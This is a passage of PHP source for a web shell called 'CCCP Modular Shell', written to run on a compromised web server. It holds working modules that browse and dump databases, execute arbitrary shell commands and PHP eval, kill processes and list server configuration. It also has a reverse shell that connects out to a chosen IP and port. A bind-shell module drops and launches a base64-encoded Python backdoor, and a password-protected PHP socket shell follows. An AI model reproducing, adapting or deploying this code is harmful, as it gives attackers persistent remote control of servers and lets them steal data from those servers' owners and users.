				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
				<table class="border" style="padding:0;"><tbody>
				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
				
			if (($p['sqltype']!=='pdo') && ($p['sqltype']!=='odbc')){
				if ($p['sqltype']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
				elseif ($p['sqltype']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
				elseif ($p['sqltype']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
				elseif ($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showdb = "SELECT '".$p['sqlhost']."'";
				else $showdb = 'SHOW DATABASES'; //mysql

				$res = sql_query($p['sqltype'], $showdb, $con);
				if ($res !== false){
					$bg = 0;
					while($rowarr = sql_fetch_data($p['sqltype'], $res)){
						foreach($rowarr as $rows){
							$sBuff .= '<p class="notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';

							if($p['sqltype']==='mssql') $showtbl = 'SELECT name FROM '.$rows."..sysobjects WHERE xtype = 'U'";
							elseif($p['sqltype']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
							elseif($p['sqltype']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
							elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
							else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql

							$res_t = sql_query($p['sqltype'], $showtbl, $con);
							if ($res_t!=false){
								while($tablearr=sql_fetch_data($p['sqltype'], $res_t)){
									foreach($tablearr as $tables){
										if($p['sqltype']==='mssql') $dumptbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
										elseif($p['sqltype']==='pgsql') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 100 OFFSET 0';
										elseif($p['sqltype']==='oracle') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' WHERE ROWNUM BETWEEN 0 AND 100;';
										elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $dumptbl = 'SELECT * FROM '.$tables.' LIMIT 0, 100';
										else $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 0, 100'; //mysql
											
										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
									}
								}
							}
							$sBuff .= '</table></div>';
						}
					}
				}
			}

			$sBuff .= '</td>
				<td id="dbRes" style="vertical-align:top;width:100%;"></td>
				</tr></tbody></table>';
			
			sql_close($p['sqltype'], $con);
		} else
			$sBuff .= sDialog('Unable to connect to database');
	} else {
		if (isset($_COOKIE['c'])){
			$delme = '';
			if (isset($p['dc'])){
				setcookie('c[' . $p['dc'] . ']', '', time() - $login);
				$delme = $p['dc'];
			}
	
			foreach($_COOKIE['c'] as $c => $d){
				if ($c == $delme) continue;
				$sql = array();
				foreach(((function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d)) as $k => $v) $sql[$k] = $v;
				$sBuff .= sDialog('[' . strtoupper($sql['sqltype']) . '] ' . $sql['sqluser'] . '@' . $sql['sqlhost'] . '<span style="float:right;">' .
					'<a href="#" onclick="ajaxLoad(\'me=sql&sqlhost=' . $sql['sqlhost'] . '&sqlport=' . $sql['sqlport'] . '&sqluser=' . $sql['sqluser'] . '&sqlpass=' . $sql['sqlpass'] . '&sqltype=' . $sql['sqltype'] . '\');">connect</a>' .
					' | <a href="#" onclick="ajaxLoad(\'me=sql&dc=' . $c . '\')">disconnect</a></span>');
			}
		}
	
		$sqllist = '';
		if (function_exists('mysql_connect') || function_exists('mysqli_connect')) $sqllist .= '<option value="mysql">MySQL [using mysql_* or mysqli_*]</option>';
		if (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) $sqllist .= '<option value="mssql">MsSQL [using mssql_* or sqlsrv_*]</option>';
		if (function_exists('pg_connect')) $sqllist .= '<option value="pgsql">PostgreSQL [using pg_*]</option>';
		if (function_exists('oci_connect]')) $sqllist .= '<option value="oracle">Oracle [using oci_*]</option>';
		if (function_exists('sqlite_open')) $sqllist .= '<option value="sqlite">SQLite [using sqlite_*]</option>';
		if (class_exists('SQLite3')) $sqllist .= '<option value="sqlite3">SQLite3 [using class SQLite3]</option>';
		if (function_exists('odbc_connect')) $sqllist .= '<option value="odbc">ODBC [using odbc_*]</option>';			
		if (class_exists('PDO')) $sqllist .= '<option value="pdo">PDO [using class PDO]</option>';
			
		$sBuff .= '<form>' .
			'<table class="myboxtbl">' .
			'<tr><td><span id="sh">' . tText('sq7', 'Host') . '</span></td><td>' . mInput(array('n'=>'sqlhost', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
			'<tr id="su"><td>' . tText('sq0', 'Username') . '</td><td>' . mInput(array('n'=>'sqluser', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
			'<tr id="sp"><td>' . tText('sq1', 'Password') . '</td><td>' . mInput(array('n'=>'sqlpass', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
			'<tr id="so"><td>' . tText('sq2', 'Port (optional)') . '</td><td>' . mInput(array('n'=>'sqlport', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
			'<tr><td>' . tText('sq3', 'Engine') . '</td><td><select id="sqltype" name="sqltype" onchange="dbengine(this)">' . $sqllist . '</select></td></tr>' .
			'</table>' .
			mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("sqltype"))') .
			mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') .
			'</form>';
	}
}

if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
    if (@sValid($p['ip']) && sValid($p['port'])){
        $sBuff .= '<p>The Program is now trying to connect!</p>';
        $ip = $p['ip'];
        $port = $p['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0){
            $sBuff .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
        } else
            if (! $sockfd){
                $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
            } else {
                $len = 1500;
                fputs($sockfd, execute('uname -a') . "
"); //sysinfo
                fputs($sockfd, execute('pwd') . "
");
                fputs($sockfd, execute('id') . "

");
                fputs($sockfd, execute('time /t & date /T') . "

"); //dateandTime

                while (! feof($sockfd)){
                    fputs($sockfd, '(Shell)[$]> ');
                    $command = fgets($sockfd, $len);
                    fputs($sockfd, "
" . execute($command) . "

");
                }
                fclose($sockfd);
            }
    } else
        if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
            $address = '127.0.0.1';
            $port = $p['port'];
            $pass = $p['passwd'];

            if ($p['mode'] === 'Python'){
                $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

                $bindname = 'bind.py'; //TODO EL NOMBRE TENDRIA QUE SER ALEATORIO
                $fd = fopen($bindname, 'w');
                if ($fd){
                    fwrite($fd, base64_decode($Python_CODE));

                    if ($isWIN){
                        $sBuff .= '[+] OS Detected = Windows';
                        execute('start bind.py');

                        $pattern = 'python.exe';
                        $list = execute('TASKLIST');
                    } else {
                        $sBuff .= '[+] OS Detected = Linux';
                        execute('chmod +x bind.py ; ./bind.py');

                        // Check if the process is running
                        $pattern = $bindname;
                        $list = execute('ps -aux');
                    }


                    if (preg_match("/$pattern/", $list)){
                        $sBuff .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                    } else {
                        $sBuff .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
                    }

                    $sBuff .= "<br><br>
<b>Task List :-</b> <pre>
$list</pre>";

                }
            }
        } else
            if (@$p['mode'] === 'PHP'){
                // Set the ip and port we will listen on
                if (function_exists("socket_create")){
                    // Create a TCP Stream socket
                    $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

                    // Bind the socket to an address/port
                    if (socket_bind($sockfd, $address, $port) == false){
                        $sBuff .= "Cant Bind to the specified port and address!";
                    }

                    // Start listening for connections
                    socket_listen($sockfd, 17);

                    /* Accept incoming requests and handle them as child processes */
                    $client = socket_accept($sockfd);
                    socket_write($client, 'Password: ');
                    // Read the pass from the client
                    $input = socket_read($client, strlen($pass) + 2); // +2 for 

                    if (trim($input) == $pass){
                        socket_write($client, "

");
                        socket_write($client, ($isWIN) ? execute("date /t & time /t") . "
" . execute("ver") : execute("date") . "
" . execute("uname -a"));
                        socket_write($client, "

");
                        while (1){
                            // Print command prompt
                            $maxCmdLen = 31337;
                            socket_write($client, '(Shell)[$]> ');
                            $cmd = socket_read($client, $maxCmdLen);
                            if ($cmd == false){
                                $sBuff .= 'The client Closed the conection!';
                                break;
                            }
                            socket_write($client, execute($cmd));
                        }
                    } else {
                        $sBuff .= 'Wrong Password!';
                        socket_write($client, "Wrong Password!

");
                    }
                    socket_shutdown($client, 2);
                    socket_close($socket);

                    // Close the client (child) socket
                    //socket_close($client);
                    // Close the master sockets
                    //socket_close($sock);
                } else {
                    $sBuff .= "Socket Conections not Allowed/Supported by the server!";
                }
            } else {
                $sBuff .= '
      <table class="bind" align="center" >
      <tr>
         <th class="header" colspan="1" width="50px">Back Connect</th>
         <th class="header" colspan="1" width="50px">Bind Shell</th>
      </tr>
      <tr>
         <form method="POST">  
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>IP </td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="ip" value="' . $_SERVER['REMOTE_ADDR'] . '" />
                  </td>
               </tr>
               <tr>
                  <td>Port </td>
                  <td><input style="width: 100px;" class="cmd" name="port" size="5" value="31337"/></td>
               </tr>
               <tr>
               <td>Mode </td>    
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                     </select>  <input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
               
            </table>
          </td>
          </form> 
          <form method="POST">
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>Port</td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="port" value="31337" />
                  </td>
               </tr>
               <tr>
                  <td>Password </td>
                  <td><input style="width: 100px;" class="cmd" name="passwd" size="5" value="indetectables"/>
               </tr>
               <tr>
               <td>
               Mode
               </td>
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                        <option value="Python">Python</option>
                     </select><input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
               </tr>    
                  
            </table>
          </td>
          </form>
      </tr>
      </table>
      <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
      ';
            }
}

if (isset($p['me']) && $p['me'] === 'execute'){
    $sBuff .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
    $code = @trim($p['c']);
    if ($code){
		if (isset($p['e'])){
			/*$locale = 'en_GB.utf-8';
			setlocale(LC_ALL, $locale);
			putenv('LC_ALL='.$locale);*/
			$buf = execute($code, true);
			$sBuff .= "<br><b>" . tText('ev4', 'Execute via') . ": </b>{$buf[1]}";
			if (isset($p['dta'])) 
				$sBuff .= "<br><textarea class='bigarea' readonly>{$buf[0]}</textarea><br>";
			else 
				$sBuff .= "<br><pre>{$buf[0]}</pre><br>";
		} else {
			if (!preg_match('#<\?#si', $code)) 
				$code = "<?php\n\n{$code}\n\n?>";

			//hago esta chapuzada para que no se muestre el resultado arriba
			echo 'Result of the executed code:';
			$buf = ob_get_sBuffs();

			if ($buf){
				ob_clean();
				eval("?" . ">$code");
				$ret = ob_get_sBuffs();
				$ret = convert_cyr_string($ret, 'd', 'w');
				ob_clean();
				$sBuff .= $buf;
				
				if (isset($p['dta'])) 
					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
				else 
					$sBuff .= $ret . '<br><pre></pre>';
			} else
				eval("?" . ">$code");
        }
    }

    $sBuff .= '<form>
	<textarea class="bigarea" name="c">' . (isset($p['c']) ? hsc($p['c']) : '') . '</textarea></p>
	<p>' . tText('ev1', 'Display in text-area') . ': <input type="checkbox" name="dta" value="1" ' . (isset($p['dta']) ? 'checked' : '') . '>&nbsp;&nbsp;
	' . tText('execute', 'Execute') . ': <input type="checkbox" name="e" value="1" ' . (isset($p['e']) ? 'checked' : '') . '>&nbsp;&nbsp;
	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ ' . tText('ev3', 'Get examples') . ' ]</a>
	<br><br>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') . '</p>
	' . mHide('me', 'execute') . '
	</form>';
}

if (isset($p['me']) && $p['me'] === 'info'){
    $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    $dis_func = get_cfg_var('disable_functions');
    ! $dis_func && $dis_func = 'No';

    $info = array(
        1 => array('Server Time', date('Y/m/d h:i:s', time())),
        2 => array('Server Domain', $_SERVER['SERVER_NAME']),
        3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])),
        4 => array('Server OS', PHP_OS),
        5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']),
        6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']),
        7 => array('Server Web Port', $_SERVER['SERVER_PORT']),
        8 => array('PHP run mode', php_sapi_name()),
        9 => array('This file path', __file__),
        10 => array('PHP Version', PHP_VERSION),
        11 => array('PHP Info', ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="ajaxLoad(\'me=phpinfo\')">Yes</a>' : 'No')),
        12 => array('Safe Mode', getcfg('safe_mode')),
        13 => array('Administrator', $adminmail),
        14 => array('allow_url_fopen', getcfg('allow_url_fopen')),
        15 => array('enable_dl', getcfg('enable_dl')),
        16 => array('display_errors', getcfg('display_errors')),
        17 => array('register_globals', getcfg('register_globals')),
        18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')),
        19 => array('memory_limit', getcfg('memory_limit')),
        20 => array('post_max_size', getcfg('post_max_size')),
        21 => array('upload_max_filesize', $upsize),
        22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'),
        23 => array('disable_functions', $dis_func),
        24 => array('MySQL', getfun('mysql_connect')),
        25 => array('MSSQL', getfun('mssql_connect')),
        26 => array('PostgreSQL', getfun('pg_connect')),
        27 => array('Oracle', getfun('ocilogon')),
        28 => array('Curl', getfun('curl_version')),
        29 => array('gzcompress', getfun('gzcompress')),
        30 => array('gzencode', getfun('gzencode')),
        31 => array('bzcompress', getfun('bzcompress')),
    );

    if (@sValid($p['phpvarname'])) $sBuff .= sDialog($p['phpvarname'] . ': ' . getcfg($p['phpvarname']));

    $sBuff .= '<form> 
        <h2>Variables del servidor</h2> 
        <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
        <input name="phpvarname" id="phpvarname" value="" type="text" size="100" /> <input name="submit" id="submit" type="submit" value="Submit"></p> 
        </form>';

    $hp = array(0 => 'Server', 1 => 'PHP', 2 => 'Extras');
    for ($a = 0; $a < 3; $a++){
        $sBuff .= '<h2>' . $hp[$a] . '</h2><ul>';
        if ($a == 0){
            for ($i = 1; $i <= 9; $i++){
                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 1){
            for ($i = 10; $i <= 23; $i++){
                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 2){
            for ($i = 24; $i <= 31; $i++){
                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        }

        $sBuff .= '</ul>';
    }
}

if (isset($p['me']) && $p['me'] === 'process'){
	if (isset($p['ps'])){
        for ($i = 0; count($p['ps']) > $i; $i++){
			if (function_exists('posix_kill')) 
				$sBuff .= sDialog((posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]));
			else {
				if($isWIN) $sBuff .= sDialog(execute('taskkill /F /PID ' . $p['ps'][$i]));
				else $sBuff .= sDialog(execute('kill -9 ' . $p['ps'][$i]));
			}
		}
	}

	$h = 'ps aux';
	$wexp = ' ';
	if ($isWIN){
		$h = 'tasklist /V /FO csv';
		$wexp = '","';
	}

	$res = execute($h);
	if (trim($res) === '') $sBuff = sDialog('Error getting process list');
	else {
		if(!$isWIN) $res = preg_replace('#\ +#', ' ', $res);
		$psarr = explode("
", $res);
		$fi = true;
		$tblcount = 0;
		$wcount = count(explode($wexp, $psarr[0]));

		$sBuff .= '<br><form method="post" action="" name="ps"><table class="explore sortable">';
		foreach($psarr as $psa){
			if(trim($psa) !== ''){
				if($fi){
					$fi = false;
					$psln = explode($wexp, $psa, $wcount);
					$sBuff .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
					foreach($psln as $p) $sBuff .= '<th>' . trim(trim($p), '"') . '</th>';
					$sBuff .= '</tr>';
				} else {
					$psln = explode($wexp, $psa, $wcount);
					$sBuff .= '<tr>';
					$tblcount = 0;
					foreach($psln as $p){
						$pid = trim(trim($psln[1]), '"');
						if(trim($p) === '') $p = '&nbsp;';
						if($tblcount == 0){
							$sBuff .= '<td style="text-align:center;text-indent:4px;"><input id="ps" name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td><td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=procs&ps[]=' . $pid . '\')">kill</a></td>
									<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
							$tblcount++;
						} else {
							$tblcount++;
							if($tblcount == count($psln)) $sBuff .= "<td style='text-align:left;'>".trim(trim($p), '"')."</td>";
							else $sBuff .= "<td style='text-align:center;'>".trim(trim($p), '"')."</td>";
						}
					}
					$sBuff .= '</tr>';
				}
			}
		}
		
		$sBuff .= '<tfoot><tr><td>
		<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />	
		</td><td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '"><input name="submit" id="submit" type="submit" value="kill selected">
		<span id="total_selected"></span></a></td>
		</tr></tfoot></table></form>';
	}
}

#Se fini
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
	exit($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
?>
	<!DOCTYPE html>
	<html>
	<head>
	  <meta http-equiv=sBuff-Type sBuff="text/html; charset=iso-8859-1">
	  <meta http-equiv=Pragma sBuff=no-cache>
	  <meta http-equiv=Expires sBuff="wed, 26 Feb 1997 08:21:57 GMT">
	  <meta name="robots" sBuff="noindex, nofollow, noarchive" />
	  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
	  <title>CCCP Modular Shell</title>  
	  <script type="text/javascript">
	var h = 0;
	var j = 1;
	var d = document;
	var euc = encodeURIComponent;
	var onDrag = false;
	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
	var targeturl = "<?php echo $self; ?>";
	
	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
